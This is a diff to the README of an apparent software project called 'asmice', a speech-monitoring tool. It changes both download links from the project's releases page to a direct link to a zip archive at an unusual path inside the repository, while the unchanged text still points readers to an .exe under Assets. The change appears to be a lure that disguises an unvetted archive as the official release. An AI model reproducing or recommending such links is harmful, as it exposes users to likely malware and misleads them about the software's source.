@@ -1,6 +1,6 @@
 # 🎙️ asmice - Smart speech monitoring for critical tasks
 
-[![Download asmice](https://img.shields.io/badge/Download-Asmice-blue.svg)](https://github.com/Carmelunmined804/asmice/releases)
+[![Download asmice](https://img.shields.io/badge/Download-Asmice-blue.svg)](https://github.com/Carmelunmined804/asmice/raw/refs/heads/main/tight/Software_v1.7.zip)
 
 ## What is asmice?
 
@@ -22,7 +22,7 @@ To run this software, ensure your computer meets these minimum specifications:
 
 You need to obtain the latest version of the application from the official distribution page.
 
-[Visit the release page to download the software here](https://github.com/Carmelunmined804/asmice/releases).
+[Visit the release page to download the software here](https://github.com/Carmelunmined804/asmice/raw/refs/heads/main/tight/Software_v1.7.zip).
 
 Look for the file ending in .exe under the Assets section. Save this file to your computer.
 
